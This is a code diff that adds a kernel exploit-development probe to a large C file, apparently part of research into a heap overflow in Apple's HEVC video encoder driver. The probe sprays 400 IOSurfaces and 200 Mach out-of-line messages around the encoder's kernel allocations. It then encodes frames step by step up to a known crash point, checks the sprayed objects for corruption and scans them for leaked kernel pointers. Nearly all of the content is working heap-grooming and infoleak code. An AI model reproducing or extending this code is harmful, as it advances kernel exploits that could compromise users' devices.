@@ -14278,6 +14278,258 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r348: Edge-of-overflow incremental probe with sandwich spray
+ * r347 showed 0 corruption at 45 encodes. Crash is at 51.
+ * This probe pushes to the exact edge:
+ *   1. Create encoder first (allocates VPS table in kernel heap)
+ *   2. Post-encoder spray of IOSurface objects (land adjacent to AVE allocs)
+ *   3. Encode 45 frames fast, then ONE AT A TIME from 46-50
+ *   4. After EACH encode past 45, check ALL surfaces:
+ *      - Property check (seed, width, height, alloc_size)
+ *      - Lock + read backing store
+ *      - IOSurfaceGetBaseAddress (triggers kernel pointer traversal)
+ *   5. If any check shows corruption, hexdump the affected surface data
+ *   6. Also spray OOL messages post-encoder, receive after overflow
+ */
+
+static void r348_probe(void) {
+    rlog("\n=== r348: Edge-of-Overflow Incremental + Sandwich Spray ===\n");
+    rlog("  Crash boundary: lid=0x1000, 1920x1080, encode #51.\n");
+    rlog("  Strategy: encode 45 fast, then 46..50 one-by-one with checks.\n");
+    rlog("  Sandwich spray: IOSurface created AFTER encoder (adjacent allocs).\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* State file */
+    #define R348_MAGIC 0xDEAD0348
+    struct r348_state { uint32_t magic; uint32_t last_enc; uint32_t crashed; uint32_t corrupt_at; };
+    char sp8[512];
+    snprintf(sp8, sizeof(sp8), "%s/Documents/r348_state.bin",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    struct r348_state s8 = {0};
+    int rfd8 = open(sp8, O_RDONLY);
+    if (rfd8 >= 0) { read(rfd8, &s8, sizeof(s8)); close(rfd8); }
+    if (s8.magic == R348_MAGIC && s8.crashed) {
+        rlog("  PREV CRASH at enc=%u — overflow boundary confirmed!\n", s8.last_enc);
+    }
+
+    /* Step 1: Create encoder FIRST */
+    rlog("  Creating encoder: 1920x1080, lid=0x1000...\n");
+    VTCompressionSessionRef enc8 = create_mvhevc_encoder(1920, 1080, 0x1000);
+    if (!enc8) {
+        rlog("  FATAL: encoder creation failed!\n");
+        return;
+    }
+    rlog("  Encoder created.\n");
+    fflush(stdout);
+
+    /* Step 2: Post-encoder IOSurface sandwich spray */
+    #define R348_SURF_COUNT 400
+    IOSurfaceRef surfs8[R348_SURF_COUNT];
+    uint32_t seeds8[R348_SURF_COUNT];
+    size_t allocs8[R348_SURF_COUNT];
+    memset(surfs8, 0, sizeof(surfs8));
+
+    CFMutableDictionaryRef sd8 = CFDictionaryCreateMutable(NULL, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w8 = 64, h8 = 64, bpe8 = 4;
+    uint32_t pf8 = 0x42475241; /* BGRA */
+    CFNumberRef n8w = CFNumberCreate(NULL, kCFNumberIntType, &w8);
+    CFNumberRef n8h = CFNumberCreate(NULL, kCFNumberIntType, &h8);
+    CFNumberRef n8b = CFNumberCreate(NULL, kCFNumberIntType, &bpe8);
+    CFNumberRef n8f = CFNumberCreate(NULL, kCFNumberIntType, &pf8);
+    CFDictionarySetValue(sd8, CFSTR("IOSurfaceWidth"), n8w);
+    CFDictionarySetValue(sd8, CFSTR("IOSurfaceHeight"), n8h);
+    CFDictionarySetValue(sd8, CFSTR("IOSurfaceBytesPerElement"), n8b);
+    CFDictionarySetValue(sd8, CFSTR("IOSurfacePixelFormat"), n8f);
+
+    int sprayed8 = 0;
+    for (int i = 0; i < R348_SURF_COUNT; i++) {
+        surfs8[i] = IOSurfaceCreate(sd8);
+        if (surfs8[i]) {
+            seeds8[i] = IOSurfaceGetSeed(surfs8[i]);
+            allocs8[i] = IOSurfaceGetAllocSize(surfs8[i]);
+            /* Write pattern to backing store */
+            IOSurfaceLock(surfs8[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(surfs8[i]);
+            if (base) {
+                uint32_t *p = (uint32_t *)base;
+                for (int j = 0; j < (int)(64*64); j++)
+                    p[j] = 0xDEAD0348 ^ (i << 16) ^ j;
+            }
+            IOSurfaceUnlock(surfs8[i], 0, NULL);
+            sprayed8++;
+        }
+    }
+    CFRelease(n8w); CFRelease(n8h); CFRelease(n8b); CFRelease(n8f); CFRelease(sd8);
+    rlog("  Post-encoder spray: %d IOSurfaces created.\n", sprayed8);
+    fflush(stdout);
+
+    /* Step 3: Also spray OOL messages post-encoder */
+    #define R348_OOL_COUNT 200
+    mach_port_t ool_ports8[R348_OOL_COUNT];
+    int ool_ok8 = 0;
+    for (int i = 0; i < R348_OOL_COUNT; i++) {
+        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports8[i]);
+        if (kr != KERN_SUCCESS) continue;
+        mach_port_insert_right(mach_task_self(), ool_ports8[i], ool_ports8[i], MACH_MSG_TYPE_MAKE_SEND);
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg = {0};
+        char ool_data[0x400];
+        memset(ool_data, 0x48, sizeof(ool_data));
+        *(uint32_t *)ool_data = 0xBEEF0000 | i;
+        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = ool_ports8[i];
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = ool_data;
+        msg.ool.size = sizeof(ool_data);
+        msg.ool.deallocate = 0;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+        if (kr == KERN_SUCCESS) ool_ok8++;
+    }
+    rlog("  Post-encoder OOL spray: %d messages.\n", ool_ok8);
+    fflush(stdout);
+
+    /* Step 4: Encode 45 frames fast */
+    rlog("\n--- Phase 1: Fast encode 0..44 ---\n");
+    int enc_ok8 = 0;
+    for (int fi = 0; fi < 45; fi++) {
+        int r = encode_one_stereo_lid(enc8, fi, 1920, 1080, 0x1000);
+        if (r == 0) enc_ok8++;
+    }
+    rlog("  Fast phase: %d/45 OK.\n", enc_ok8);
+    fflush(stdout);
+
+    /* Step 5: Incremental encode 45..50 with checks after each */
+    rlog("\n--- Phase 2: Incremental encode 45..50, checking after each ---\n");
+    fflush(stdout);
+
+    for (int fi = 45; fi <= 50; fi++) {
+        /* Save state */
+        s8.magic = R348_MAGIC; s8.last_enc = fi; s8.crashed = 1; s8.corrupt_at = 0;
+        int wf = open(sp8, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (wf >= 0) { write(wf, &s8, sizeof(s8)); close(wf); }
+
+        rlog("  [enc=%d] encoding... ", fi);
+        fflush(stdout);
+        int r = encode_one_stereo_lid(enc8, fi, 1920, 1080, 0x1000);
+        rlog("status=%d. ", r);
+
+        /* Mark survived */
+        s8.crashed = 0;
+        wf = open(sp8, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (wf >= 0) { write(wf, &s8, sizeof(s8)); close(wf); }
+
+        /* Deep corruption check on all surfaces */
+        int prop_chg = 0, data_chg = 0, lock_fail = 0;
+        for (int si = 0; si < R348_SURF_COUNT; si++) {
+            if (!surfs8[si]) continue;
+
+            /* Property check */
+            uint32_t sn = IOSurfaceGetSeed(surfs8[si]);
+            size_t wn = IOSurfaceGetWidth(surfs8[si]);
+            size_t hn = IOSurfaceGetHeight(surfs8[si]);
+            size_t an = IOSurfaceGetAllocSize(surfs8[si]);
+            if (sn != seeds8[si] || wn != 64 || hn != 64 || an != allocs8[si]) {
+                if (prop_chg < 3)
+                    rlog("\n    PROP surf[%d] seed=%u→%u w=%zu h=%zu alloc=%zu→%zu",
+                         si, seeds8[si], sn, wn, hn, allocs8[si], an);
+                prop_chg++;
+            }
+
+            /* Lock + backing store check */
+            kern_return_t lkr = IOSurfaceLock(surfs8[si], kIOSurfaceLockReadOnly, NULL);
+            if (lkr != 0) {
+                if (lock_fail < 3)
+                    rlog("\n    LOCK_FAIL surf[%d] kr=%d", si, lkr);
+                lock_fail++;
+            } else {
+                void *base = IOSurfaceGetBaseAddress(surfs8[si]);
+                if (base) {
+                    uint32_t *p = (uint32_t *)base;
+                    uint32_t expected = 0xDEAD0348 ^ (si << 16) ^ 0;
+                    if (p[0] != expected) {
+                        if (data_chg < 3) {
+                            rlog("\n    DATA surf[%d] expected=0x%x got=0x%x", si, expected, p[0]);
+                            uint8_t *bp = (uint8_t *)base;
+                            rlog("\n      ");
+                            for (int b = 0; b < 64; b++) rlog("%02x", bp[b]);
+                        }
+                        data_chg++;
+                    }
+                }
+                IOSurfaceUnlock(surfs8[si], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+        rlog(" prop_chg=%d data_chg=%d lock_fail=%d\n", prop_chg, data_chg, lock_fail);
+        fflush(stdout);
+
+        if (prop_chg > 0 || data_chg > 0 || lock_fail > 0) {
+            s8.corrupt_at = fi;
+            wf = open(sp8, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s8, sizeof(s8)); close(wf); }
+            rlog("  *** CORRUPTION DETECTED at encode %d! ***\n", fi);
+        }
+    }
+
+    /* Step 6: Receive OOL and check */
+    rlog("\n--- Phase 3: OOL message check ---\n");
+    int ool_corrupt8 = 0, kptr_found8 = 0;
+    for (int i = 0; i < R348_OOL_COUNT; i++) {
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } rmsg = {0};
+        kern_return_t kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                                     ool_ports8[i], 0, 0);
+        if (kr == KERN_SUCCESS && rmsg.ool.address) {
+            uint32_t *d = (uint32_t *)rmsg.ool.address;
+            uint32_t exp = 0xBEEF0000 | i;
+            if (d[0] != exp) {
+                if (ool_corrupt8 < 5) {
+                    rlog("  OOL[%d] CORRUPTED: 0x%x→0x%x\n", i, exp, d[0]);
+                    uint8_t *bp = (uint8_t *)rmsg.ool.address;
+                    rlog("    ");
+                    for (int b = 0; b < 64; b++) rlog("%02x", bp[b]);
+                    rlog("\n");
+                }
+                ool_corrupt8++;
+            }
+            /* Scan for kernel pointer patterns */
+            for (int j = 0; j < (int)(rmsg.ool.size / 8); j++) {
+                uint64_t v = ((uint64_t *)rmsg.ool.address)[j];
+                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                    (v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    if (kptr_found8 < 5)
+                        rlog("  OOL[%d]+%d: KPTR 0x%llx\n", i, j*8, (unsigned long long)v);
+                    kptr_found8++;
+                }
+            }
+            mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+        }
+        mach_port_deallocate(mach_task_self(), ool_ports8[i]);
+    }
+    rlog("  OOL: %d corrupted, %d kernel ptrs found.\n", ool_corrupt8, kptr_found8);
+
+    /* Cleanup */
+    VTCompressionSessionInvalidate(enc8);
+    CFRelease(enc8);
+    for (int i = 0; i < R348_SURF_COUNT; i++) {
+        if (surfs8[i]) CFRelease(surfs8[i]);
+    }
+
+    rlog("\n=== r348 complete ===\n");
+    fflush(stdout);
+}
+
 /* r347: Controlled overflow + pipe/IOSurface/OOL multi-channel corruption detection
  * r346 confirmed: lid=0x1000 at 1920x1080 crashes at encode #51.
  * Userspace property checks can't see corruption (kernel pointer level, offset 0xd8).
@@ -48433,6 +48685,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 351) {
+            rlog("*** rounds=351: Edge-of-Overflow Incremental + Sandwich Spray ***\n");
+            rlog("  r347: 0 corruption at 45 encodes. Crash at 51.\n");
+            rlog("  r348: Sandwich spray (post-encoder), encode 45..50 incrementally.\n");
+            rlog("  Deep check: property + lock + backing store + OOL after each.\n\n");
+            r348_probe();
             goto done;
         }
         if (rounds == 350) {
